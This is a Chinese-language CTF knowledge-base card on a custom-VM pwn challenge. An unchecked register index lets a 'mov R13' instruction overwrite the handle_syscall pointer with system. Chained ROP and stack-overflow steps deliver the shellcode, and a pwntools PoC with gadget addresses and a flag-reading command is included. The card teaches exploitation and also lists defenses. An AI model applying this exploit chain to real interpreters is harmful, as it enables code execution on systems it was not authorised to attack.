---
id: ctf-pwn-custom-vm-oob-register-index-handle-syscall-hijack
title: 自定义 VM 越界寄存器索引劫持 handle_syscall：R13 写入控制字段后 syscall 变 system
type: scenario
domain: ctf
path: ctf/pwn
technique: custom-vm-oob-register-index-handle-syscall-hijack
tags:
- ctf
- pwn
- vm
- bytecode
- oob-register
- function-pointer
- syscall
- ret2shellcode
- rop
- fifo
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V502
  verified_at: '2026-11-11T03:28:20+08:00'
  notes: 已对照原文与图05/09/10/11核对：vm 结构布局 regs[8] 后 sp/lr/pc/fl/mem/handle_syscall 索引13（原文表格0xd）、mov 高4位选寄存器 07 d0 05 00、输入禁 0x0a/0x0d 与 0xd0 绕过、syscall→handle_syscall(vm,id)→system(vm)、kitchen 菜单2 read 0xff 入 var_44（图11，saved_LR@-0x004）、pop LR/R5/R4/R2/R1/R0 gadget@0x164（图05）、gordon 0xc0cac01a 分发与 command_c0ca 的 memcpy(&var_84,arg1,0x100)（图10）、非 PIE 静态二进制 system@0x4033A2、gordon 栈 RWX、FIFO 外带 flag 均与卡一致。PoC 按原文脚本整理为结构示意（省略挑战应答），未复跑。dedup 候选为操作数栈下溢/上溢改 GOT、合法 syscall opcode ORW、ARX 求逆等不同原语，无同链；dup-scan.json 早于建卡不涉及本卡；frontmatter 无 sources/source_url；CTF 题无版本。
url: /docs/ctf/pwn/ctf-pwn-custom-vm-oob-register-index-handle-syscall-hijack/
draft: false
kb_aliases:
- VM 越界寄存器索引
- R13 handle_syscall
- mov 高四位选寄存器
- syscall 处理器劫持
- Pot of Gold 利用
- 双 VM FIFO 利用
- VM 结构体函数指针覆盖
---

## 一句话结论

自定义 VM 的指令处理器不校验寄存器索引时，`vm->regs[8..]` 之后的控制字段可被当成寄存器访问：索引 13 正好落在 `handle_syscall` 函数指针上；用 `mov` 指令（参数高 4 位选目标寄存器，编码为 `07 d0 xx xx` 绕开输入禁止字节 `0x0a/0x0d`）把该指针改成宿主的 `system`，再执行 `syscall` 让 VM 调用 `handle_syscall(vm, id)`——实际变成 `system(vm)`，而 `vm` 起始处就是可控的 `regs[0..]`，把命令字符串塞进寄存器即可以 VM 进程权限执行任意命令。

## 原理

- **VM 结构布局**：`struct vm { uint64_t regs[8]; uint64_t sp; uint64_t lr; uint64_t pc; uint64_t fl; void *mem; void (*handle_syscall)(struct vm*, int); bool stopped; bool is_master; }`。寄存器数组之后紧邻 sp/lr/pc/fl/mem/handle_syscall 等控制字段；一旦索引不做边界检查，`regs[13]`（0xd）就是 `handle_syscall`。
- **指令编码给了可乘之机**：`mov` 指令用参数高 4 位选择目标寄存器，例如 `mov rDst, rSrc` 编码为 `07 (Dst<<4|...) ...`；虽然输入读取在遇到 `0x0a`/`0x0d` 时停止，无法直接写出字节 `0x0d`，但 `0xd0` 字节不是 `0x0d`，所以 `07 d0 05 00` 可正常编码"目标寄存器索引 0xd"。
- **劫持调用路径**：`syscall` 指令执行 `vm->handle_syscall(vm, arg1)`；把 `handle_syscall` 覆盖为宿主二进制中的 `system` 后，`system` 的第一个参数就是 `vm*`，即指向 `regs[0]` 的指针。利用代码用 `pop r0..r3` 把 `"cat /fla* > /tmp/x_master\0"` 按 8 字节分片写入寄存器，`system(vm)` 便把寄存器字节当作命令字符串执行。
- **两段 VM 与可达性**：挑战由 master（gordon）与 slave（kitchen）两个 VM 进程组成，通过命名管道 `/tmp/x_master`、`/tmp/x_slave` 通信。kitchen 的菜单 2 在 VM 内把 `0xff` 字节读入 `0x44` 栈缓冲区，溢出可覆盖保存的 LR；gordon 的 `0xc0cac01a` 命令有 `memcpy(&var_84, arg1, 0x100)` 溢出，但初始不可达。先在 kitchen 用 ROP 调发送命令的 gadget 把 `0xc0cac01a` 负载发给 gordon，再触发 gordon 的溢出跳到其栈上的 shellcode（gordon VM 栈可读写执行），即在 gordon 内执行上述寄存器索引劫持。
- **为什么利用直接**：两个 VM 的栈都没有 cookie/ASLR，宿主二进制静态链接且非 PIE，`system` 地址固定；kitchen 中存在 `pop LR,R5,R4,R2,R1,R0; ret` gadget，可控制 syscall 4 的参数（FIFO 指针/长度）与返回地址，从而完成跨进程投递。
- **结果外带**：`run.sh` 关闭了 stdout/stderr，命令把 `/fla*` 重定向写入 `/tmp/x_master`；kitchen 再经 ROP 调用接收并打印的 gadget，把 flag 从 FIFO 读回并输出。
- **边界**：依赖 VM 实现缺陷（索引不校验 + 控制字段紧邻寄存器数组 + 栈 RWX）、输入禁止字节与指令编码的具体形式；换 VM 实现需重新找越界索引与可控字段。

## 触发条件

- 目标 VM 的寄存器读写指令不检查索引上限，且控制字段（函数指针/回调）位于寄存器数组之后的固定偏移。
- 存在可编码越界索引而不触发输入过滤（如禁止 `0x0a/0x0d`）的指令形式。
- VM 栈可写且可执行（或能通过其他方式把 shellcode 放到可执行内存），宿主无 ASLR/栈保护或地址可预测。
- 能通过输入触发至少一个 VM 内的栈溢出并控制返回地址。

## 利用步骤

1. 逆 VM 结构与指令编码：确认 `regs[8]` 后各字段偏移、`handle_syscall` 索引（本例 13）、`mov` 的高四位寄存器选择与输入禁止字节。
2. 在 kitchen 触发菜单 2 的 `0x44` 缓冲区溢出，覆盖保存的 LR；用 `pop LR,R5,R4,R2,R1,R0; ret` gadget 控制 R0-R2/LR。
3. ROP 调用发送 gadget，把 gordon 的 `0xc0cac01a` 命令负载（含后续 ret2shellcode）经 FIFO 发给 gordon。
4. 触发 gordon 的 `memcpy` 栈溢出，覆盖返回地址跳到大栈上的 shellcode（gordon 栈 RWX）。
5. shellcode 用 `pop r5` 取 `system` 地址，`mov R13, R5` 覆盖 `handle_syscall`；`pop r0..r3` 写入命令字符串分片；执行 `syscall`（任意 ID）触发 `system(vm)`。
6. 命令将 flag 写入 `/tmp/x_master`；kitchen 侧 ROP 调用接收并打印 gadget 读回 flag。
7. 清理/验证：确认无 `0x0a/0x0d` 字节混入负载、长度不超过 FIFO 消息限制（示例 `0xff`）。

## PoC

```python
from pwn import *

# 关键地址（本例静态、非 PIE、无 ASLR）
pop_lr_r5_r4_r2_r1_r0 = 0x164
send_command_gadget   = 0x5b0
recv_and_print        = 0x714
stack_in_kitchen      = 0xfdb8
stack_in_gordon       = 0xef7c
system_api_chall      = 0x4033A2

payload  = p32(0xc0cac01a)              # gordon 命令 magic
payload += b'\x09\x05\x00\x00'          # pop r5  -> @system
payload += b'\x07\xd0\x05\x00'          # mov R13, R5 -> 覆盖 handle_syscall
payload += b'\x09\x00\x00\x00'          # pop r0  -> 命令分片
payload += b'\x09\x01\x00\x00'          # pop r1
payload += b'\x09\x02\x00\x00'          # pop r2
payload += b'\x09\x03\x00\x00'          # pop r3
payload += b'\x05\x07\x00\x00'          # syscall -> system(vm)
payload  = payload.ljust(0x40, b'X')
payload += p64(pop_lr_r5_r4_r2_r1_r0)   # kitchen ROP
payload += p64(send_command_gadget)
payload += p64(0) * 3 + p64(0x100) + p64(stack_in_kitchen)
payload += p64(recv_and_print)
payload  = payload.ljust(0x80, b'X')
payload += p64(stack_in_gordon)         # gordon ret2shellcode
payload += p64(system_api_chall)
payload += b'cat /fla* > /tmp/x_master\x00'

assert b'\x0a' not in payload and b'\x0d' not in payload
```

说明：PoC 按原文利用脚本整理为结构示意，省略了 kitchen 端挑战应答与部分栈布局；仅用于授权 CTF/测试环境，未复跑。

## 变体与关联

- 变体：越界索引可指向 `pc`/`lr`/内存映射指针等其他控制字段，实现任意跳转或任意读写；也可用 ALU 子操作码写越界寄存器。
- 关联：其他自定义 VM pwn 场景见 [[ctf-pwn-custom-vm-opcode-native-memory-got-restart-onegadget]]（VM 任意读写改 GOT）、[[ctf-pwn-custom-risc-vm-offset-width-mismatch-oob-rw]]（边界检查位宽不一致）、[[ctf-pwn-bytecode-vm-signed-offset-oob-write-global-command-system]]（有符号偏移越界写全局）。
- 关联：VM 字节码反编译方法见 [[code-analysis-reverse-vm-binary-ninja-custom-isa-architecture-plugin]]。
- 边界：若 VM 校验寄存器索引、控制字段与寄存器数组分离、栈不可执行或有 ASLR/canary，该链需另寻原语。

## 检测与防御

- VM/解释器实现：所有寄存器/内存访问做索引与长度边界检查；控制字段（函数指针、回调、长度）与寄存器数组之间加隔离/随机化；VM 栈设为不可执行；输入解码层拒绝非法索引。
- CTF/分析侧：审计 `switch(opcode)` 中 `regs[arg]` 的索引来源与编码范围；检查 `mov`/ALU 指令的高位寄存器选择是否可绕过字节过滤。
- 通用：对自定义 VM 的漏洞利用要同时考虑宿主（如 system 地址、PIE/ASLR）与 VM 层（栈权限、消息长度）约束。
